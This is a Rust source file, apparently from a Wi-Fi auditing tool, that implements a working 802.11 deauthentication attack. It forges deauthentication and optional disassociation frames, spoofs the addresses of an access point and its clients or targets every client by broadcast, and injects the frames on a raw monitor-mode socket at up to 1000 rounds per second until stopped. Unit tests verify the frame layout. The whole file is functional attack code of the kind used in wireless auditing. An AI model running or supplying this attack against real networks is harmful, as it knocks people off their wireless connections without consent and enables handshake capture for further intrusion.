//! Native deauthentication attacks.
//!
//! An injection thread forges 802.11 deauthentication (and, optionally, disassociation)
//! management frames and sends them on a raw socket over the monitor interface,
//! at a configurable rate, until asked to stop.

use super::raw_socket;
use crate::globals::*;
use airgorah_common::types::*;

use std::sync::Arc;
use std::sync::MutexGuard;
use std::sync::atomic::{AtomicBool, Ordering};
use std::time::Duration;

/// Broadcast address, used to deauth every client of an AP at once.
const BROADCAST: [u8; 6] = [0xff; 6];

/// 802.11 frame-control first byte for a deauthentication management frame
/// (type management, subtype 12) and a disassociation frame (subtype 10).
const SUBTYPE_DEAUTH: u8 = 0xc0;
const SUBTYPE_DISASSOC: u8 = 0xa0;

/// Reason codes: "class 3 frame received from nonassociated station" for deauth,
/// "disassociated because sending station is leaving" for disassoc.
const REASON_DEAUTH: u16 = 7;
const REASON_DISASSOC: u16 = 8;

#[derive(thiserror::Error, Debug)]
pub enum DeathError {
    #[error("Input/Output error: {0}")]
    IoError(#[from] std::io::Error),

    #[error("Invalid MAC address: {0}")]
    InvalidMac(String),
}

/// Launch a deauth attack on a specific AP.
///
/// With `specific_clients`, each client is deauthed in both directions
/// (AP→client and client→AP); otherwise a single broadcast deauth targets every
/// client. `rate` is the number of send rounds per second; `disassoc` adds a
/// disassociation frame alongside each deauth.
pub fn launch_deauth_attack(
    iface: &str,
    ap: AP,
    specific_clients: Option<Vec<String>>,
    rate: u32,
    disassoc: bool,
) -> Result<(), DeathError> {
    let bssid = parse_mac(&ap.bssid).ok_or_else(|| DeathError::InvalidMac(ap.bssid.clone()))?;

    // The (destination, source) address pairs to hit each round.
    let (target, pairs) = match specific_clients {
        Some(clients) => {
            let mut pairs = Vec::with_capacity(clients.len() * 2);
            for client in &clients {
                let mac =
                    parse_mac(client).ok_or_else(|| DeathError::InvalidMac(client.clone()))?;
                pairs.push((mac, bssid)); // AP → client
                pairs.push((bssid, mac)); // client → AP
            }
            (AttackTarget::Selection(clients), pairs)
        }
        None => (AttackTarget::All, vec![(BROADCAST, bssid)]),
    };

    let rate = rate.clamp(1, 1000);
    let interval = Duration::from_secs_f64(1.0 / f64::from(rate));

    // Open the injection socket up front so a failure is reported synchronously to
    // the GUI rather than dying silently inside the thread.
    let socket = raw_socket::open(iface)?;

    let stop = Arc::new(AtomicBool::new(false));
    let thread_stop = Arc::clone(&stop);
    let log_bssid = ap.bssid.clone();

    let handle = std::thread::spawn(move || {
        log::info!("[{log_bssid}] deauth attack started ({rate} rounds/s, disassoc: {disassoc})");

        while !thread_stop.load(Ordering::Relaxed) {
            for (dst, src) in &pairs {
                let deauth = build_mgmt_frame(SUBTYPE_DEAUTH, *dst, *src, bssid, REASON_DEAUTH);
                raw_socket::send(&socket, &deauth).ok();

                if disassoc {
                    let frame =
                        build_mgmt_frame(SUBTYPE_DISASSOC, *dst, *src, bssid, REASON_DISASSOC);
                    raw_socket::send(&socket, &frame).ok();
                }
            }

            std::thread::sleep(interval);
        }

        log::info!("[{log_bssid}] deauth attack stopped");
    });

    get_attack_pool().insert(
        ap.bssid.clone(),
        DeauthAttack {
            ap,
            target,
            stop,
            handle,
        },
    );

    Ok(())
}

/// Stop a deauth attack on a specific AP.
pub fn stop_deauth_attack(ap_bssid: &str) {
    // Remove first so the lock is released before we join the thread.
    let attack = get_attack_pool().remove(ap_bssid);

    if let Some(attack) = attack {
        attack.stop.store(true, Ordering::Relaxed);
        let _ = attack.handle.join();
    }
}

pub fn stop_all_deauth_attacks() {
    let attacked_aps: Vec<_> = get_attack_pool().keys().cloned().collect();

    for bssid in attacked_aps {
        stop_deauth_attack(&bssid);
    }
}

/// Get the attack pool
pub fn get_attack_pool() -> MutexGuard<'static, AttackPool> {
    ATTACK_POOL.lock().unwrap()
}

/// Project the live attack pool onto its serializable wire representation.
pub fn get_attack_states() -> Vec<AttackState> {
    get_attack_pool()
        .values()
        .map(|attack| AttackState {
            ap: attack.ap.clone(),
            target: attack.target.clone(),
        })
        .collect()
}

/// Build a deauth/disassoc management frame: a minimal radiotap header for
/// injection followed by the 26-byte 802.11 management frame.
fn build_mgmt_frame(
    subtype: u8,
    dst: [u8; 6],
    src: [u8; 6],
    bssid: [u8; 6],
    reason: u16,
) -> Vec<u8> {
    // Radiotap header with no fields (version, pad, len=8, present=0): the driver
    // fills in the transmit parameters.
    const RADIOTAP: [u8; 8] = [0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00];

    let mut frame = Vec::with_capacity(RADIOTAP.len() + 26);
    frame.extend_from_slice(&RADIOTAP);
    frame.push(subtype); // frame control: type/subtype
    frame.push(0x00); // frame control: flags
    frame.extend_from_slice(&[0x00, 0x00]); // duration
    frame.extend_from_slice(&dst); // address 1: destination
    frame.extend_from_slice(&src); // address 2: source
    frame.extend_from_slice(&bssid); // address 3: BSSID
    frame.extend_from_slice(&[0x00, 0x00]); // sequence control
    frame.extend_from_slice(&reason.to_le_bytes()); // reason code
    frame
}

/// Parse a canonical `xx:xx:xx:xx:xx:xx` MAC address into raw bytes.
fn parse_mac(mac: &str) -> Option<[u8; 6]> {
    let mut bytes = [0u8; 6];
    let mut parts = mac.split(':');

    for byte in &mut bytes {
        *byte = u8::from_str_radix(parts.next()?, 16).ok()?;
    }

    if parts.next().is_some() {
        return None;
    }

    Some(bytes)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn parses_a_valid_mac() {
        assert_eq!(
            parse_mac("18:86:37:1F:30:40"),
            Some([0x18, 0x86, 0x37, 0x1f, 0x30, 0x40])
        );
        assert_eq!(parse_mac("ff:ff:ff:ff:ff:ff"), Some([0xff; 6]));
    }

    #[test]
    fn rejects_a_malformed_mac() {
        assert_eq!(parse_mac("18:86:37:1F:30"), None); // too few groups
        assert_eq!(parse_mac("18:86:37:1F:30:40:55"), None); // too many groups
        assert_eq!(parse_mac("zz:86:37:1F:30:40"), None); // not hex
        assert_eq!(parse_mac(""), None);
    }

    #[test]
    fn builds_a_well_formed_deauth_frame() {
        let dst = [0x11; 6];
        let src = [0x22; 6];
        let bssid = [0x33; 6];
        let frame = build_mgmt_frame(SUBTYPE_DEAUTH, dst, src, bssid, REASON_DEAUTH);

        // 8-byte radiotap header + 26-byte 802.11 management frame.
        assert_eq!(frame.len(), 34);
        assert_eq!(&frame[0..4], &[0x00, 0x00, 0x08, 0x00]); // radiotap: v0, len 8
        assert_eq!(frame[8], SUBTYPE_DEAUTH); // frame control type/subtype
        assert_eq!(frame[9], 0x00); // frame control flags
        assert_eq!(&frame[12..18], &dst); // address 1
        assert_eq!(&frame[18..24], &src); // address 2
        assert_eq!(&frame[24..30], &bssid); // address 3
        assert_eq!(&frame[32..34], &REASON_DEAUTH.to_le_bytes()); // reason code
    }
}
